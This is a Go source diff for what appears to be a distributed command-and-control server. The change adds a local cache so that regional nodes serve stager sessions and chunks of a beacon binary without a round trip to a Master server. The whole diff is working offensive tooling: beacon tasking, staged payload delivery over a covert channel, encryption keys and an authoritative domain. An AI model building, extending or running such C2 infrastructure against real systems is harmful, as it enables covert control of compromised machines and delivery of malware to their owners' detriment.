@@ -83,20 +83,32 @@ type StagerSession struct {
 
 // C2Manager handles beacon management and tasking
 type C2Manager struct {
-	beacons         map[string]*Beacon
-	tasks           map[string]*Task
-	masterTaskIDs   map[string]string          // key: local taskID, value: master taskID
-	resultChunks    map[string][]ResultChunk   // key: taskID (legacy)
-	expectedResults map[string]*ExpectedResult // key: taskID (new two-phase)
-	stagerSessions  map[string]*StagerSession  // key: clientIP
-	recentMessages  map[string]time.Time       // key: message hash, value: timestamp (deduplication)
-	db              *Database                  // Database for persistent storage
-	mutex           sync.RWMutex
-	taskCounter     int
-	debug           bool
-	aesKey          []byte
-	jitterConfig    StagerJitter // Stager timing configuration
-	domain          string       // The domain this server is authoritative for
+	beacons              map[string]*Beacon
+	tasks                map[string]*Task
+	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
+	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
+	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
+	stagerSessions       map[string]*StagerSession       // key: clientIP
+	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
+	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
+	db                   *Database                       // Database for persistent storage
+	mutex                sync.RWMutex
+	taskCounter          int
+	debug                bool
+	aesKey               []byte
+	jitterConfig         StagerJitter // Stager timing configuration
+	domain               string       // The domain this server is authoritative for
+}
+
+// CachedStagerSession tracks stager sessions created from cached data (no Master roundtrip)
+type CachedStagerSession struct {
+	SessionID      string
+	ClientBinaryID string
+	StagerIP       string
+	TotalChunks    int
+	ChunksServed   int
+	CreatedAt      time.Time
+	LastActivity   time.Time
 }
 
 // NewC2Manager creates a new C2 management instance with the specified configuration.
@@ -114,19 +126,20 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 	}
 
 	c2 := &C2Manager{
-		beacons:         make(map[string]*Beacon),
-		tasks:           make(map[string]*Task),
-		masterTaskIDs:   make(map[string]string),
-		resultChunks:    make(map[string][]ResultChunk),
-		expectedResults: make(map[string]*ExpectedResult),
-		stagerSessions:  make(map[string]*StagerSession),
-		recentMessages:  make(map[string]time.Time),
-		db:              db,
-		taskCounter:     TaskCounterStart,
-		debug:           debug,
-		aesKey:          aesKey,
-		jitterConfig:    jitterConfig,
-		domain:          domain,
+		beacons:              make(map[string]*Beacon),
+		tasks:                make(map[string]*Task),
+		masterTaskIDs:        make(map[string]string),
+		resultChunks:         make(map[string][]ResultChunk),
+		expectedResults:      make(map[string]*ExpectedResult),
+		stagerSessions:       make(map[string]*StagerSession),
+		cachedStagerSessions: make(map[string]*CachedStagerSession),
+		recentMessages:       make(map[string]time.Time),
+		db:                   db,
+		taskCounter:          TaskCounterStart,
+		debug:                debug,
+		aesKey:               aesKey,
+		jitterConfig:         jitterConfig,
+		domain:               domain,
 	}
 
 	// Load existing beacons from database
@@ -1266,7 +1279,7 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 
 // handleStagerRequest processes a stager deployment request
 // Format: STG|IP|OS|ARCH
-// In distributed mode, forwards to Master for coordinated stager deployment
+// In distributed mode, checks local cache first for instant response
 func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDuplicate bool) string {
 	if len(parts) < 4 {
 		return "ERROR"
@@ -1280,8 +1293,74 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 		logf("[C2] Stager request from %s (%s/%s) - IP: %s", clientIP, stagerOS, stagerArch, stagerIP)
 	}
 
-	// In distributed mode, forward stager init to Master
-	if masterClient != nil {
+	// In distributed mode, check if we have cached chunks for this OS/Arch
+	if masterClient != nil && c2.db != nil {
+		// Look for cached client binary matching OS/Arch
+		// Format: beacon-{os}-{timestamp} or just use the most recent cached binary
+		// For now, we'll look for any cached binary (since we only have one beacon per OS/Arch typically)
+
+		// Get cache count to see if we have ANY cached chunks
+		// We'll use a pattern match or just check if we have cached data
+		// For simplicity, let's query for the most recent client_binary_id in cache
+
+		rows, err := c2.db.db.Query(`
+			SELECT DISTINCT client_binary_id, COUNT(*) as chunk_count
+			FROM stager_chunk_cache
+			GROUP BY client_binary_id
+			ORDER BY cached_at DESC
+			LIMIT 1
+		`)
+
+		if err == nil {
+			defer rows.Close()
+			if rows.Next() {
+				var clientBinaryID string
+				var chunkCount int
+				if err := rows.Scan(&clientBinaryID, &chunkCount); err == nil && chunkCount > 0 {
+					// We have cached chunks! Generate session locally and respond immediately
+					sessionID := fmt.Sprintf("stg_%d_%d", time.Now().UnixNano(), rand.Intn(10000))
+
+					if !isDuplicate {
+						logf("[C2] 🚀 Cache HIT for stager! Using cached binary: %s (%d chunks)", clientBinaryID, chunkCount)
+					}
+
+					// Report session creation to Master (async, fire-and-forget)
+					go func() {
+						_, err := masterClient.InitStagerSession(stagerIP, stagerOS, stagerArch)
+						if err != nil {
+							logf("[C2] Warning: Failed to report stager session to Master: %v", err)
+						}
+					}()
+
+					// Store session info locally for tracking
+					c2.mutex.Lock()
+					if c2.cachedStagerSessions == nil {
+						c2.cachedStagerSessions = make(map[string]*CachedStagerSession)
+					}
+					c2.cachedStagerSessions[sessionID] = &CachedStagerSession{
+						SessionID:      sessionID,
+						ClientBinaryID: clientBinaryID,
+						StagerIP:       stagerIP,
+						TotalChunks:    chunkCount,
+						CreatedAt:      time.Now(),
+					}
+					c2.mutex.Unlock()
+
+					// Return META immediately (no Master roundtrip!)
+					metaResponse := fmt.Sprintf("META|%s|%d", sessionID, chunkCount)
+					if !isDuplicate {
+						logf("[C2] Returning META response from cache: %s (len=%d)", metaResponse, len(metaResponse))
+					}
+					return metaResponse
+				}
+			}
+		}
+
+		// Cache miss - fall back to Master
+		if !isDuplicate {
+			logf("[C2] Cache MISS for stager, forwarding to Master...")
+		}
+
 		sessionInfo, err := masterClient.InitStagerSession(stagerIP, stagerOS, stagerArch)
 		if err != nil {
 			if !isDuplicate {
@@ -1451,21 +1530,57 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 		logf("[C2] CHUNK request: index=%d, stager_ip=%s, session_id=%s", chunkIndex, stagerIP, sessionID)
 	}
 
-	// In distributed mode, check cache first, then request from Master
-	if masterClient != nil {
-		// Try local cache first (instant response!)
-		if c2.db != nil {
-			cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
-			if err == nil && cachedChunk != "" {
+	// In distributed mode, check if this is a cached session first
+	if masterClient != nil && c2.db != nil {
+		// Check if this is a cached session (created from local cache)
+		c2.mutex.RLock()
+		cachedSession, isCached := c2.cachedStagerSessions[sessionID]
+		c2.mutex.RUnlock()
+
+		if isCached {
+			// Serve from local cache!
+			chunkData, err := c2.db.GetCachedChunk(cachedSession.ClientBinaryID, chunkIndex)
+			if err == nil && chunkData != "" {
 				if !isDuplicate {
-					logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID[:16])
+					logf("[C2] 🚀 Serving chunk %d from cache (session: %s)", chunkIndex, sessionID[:16])
 				}
-				return fmt.Sprintf("CHUNK|%s", cachedChunk)
+
+				// Update cached session stats
+				c2.mutex.Lock()
+				cachedSession.ChunksServed++
+				cachedSession.LastActivity = time.Now()
+				c2.mutex.Unlock()
+
+				// Report chunk delivery to Master (async, fire-and-forget)
+				go func() {
+					// Use the progress reporting endpoint
+					err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
+					if err != nil && c2.debug {
+						logf("[C2] Warning: Failed to report chunk %d to Master: %v", chunkIndex, err)
+					}
+				}()
+
+				return fmt.Sprintf("CHUNK|%s", chunkData)
 			}
-			// Cache miss - will query Master below
+
+			// Cache miss for this specific chunk - fall through to Master query
 			if !isDuplicate {
-				logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID[:16])
+				logf("[C2] ⚠️  Cache miss for chunk %d in cached session, querying Master", chunkIndex)
 			}
+		}
+
+		// Not a cached session OR cache miss - try regular cache lookup
+		cachedChunk, err := c2.db.GetCachedChunk(sessionID, chunkIndex)
+		if err == nil && cachedChunk != "" {
+			if !isDuplicate {
+				logf("[C2] 🚀 Cache HIT: chunk %d for session %s (instant response)", chunkIndex, sessionID[:16])
+			}
+			return fmt.Sprintf("CHUNK|%s", cachedChunk)
+		}
+
+		// Full cache miss - query Master
+		if !isDuplicate {
+			logf("[C2] Cache MISS: chunk %d for session %s, querying Master...", chunkIndex, sessionID[:16])
 		}
 
 		chunkResp, err := masterClient.GetStagerChunk(sessionID, chunkIndex, stagerIP)
@@ -1492,9 +1607,7 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 
 		// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
 		return fmt.Sprintf("CHUNK|%s", chunkResp.ChunkData)
-	}
-
-	// Standalone mode - look up local session
+	} // Standalone mode - look up local session
 	c2.mutex.RLock()
 	session, exists := c2.stagerSessions[stagerIP]
 	c2.mutex.RUnlock()
